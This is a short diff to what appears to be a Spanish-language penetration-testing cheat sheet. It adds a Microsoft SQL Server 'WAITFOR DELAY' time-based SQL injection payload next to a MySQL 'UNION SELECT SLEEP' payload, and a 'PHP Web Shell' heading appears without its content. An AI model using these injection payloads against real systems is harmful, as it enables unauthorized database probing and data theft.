@@ -237,9 +237,13 @@ UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_co
 ```
 ### Time Based
 
-Injección 
+Injección UNION BASED SQL
 ```
 UNION SELECT SLEEP(5),2,...; - --
+```
+MSSQL
+```
+WAITFOR DELAY '00:00:30'; --
 ```
 
 ### PHP Web Shell
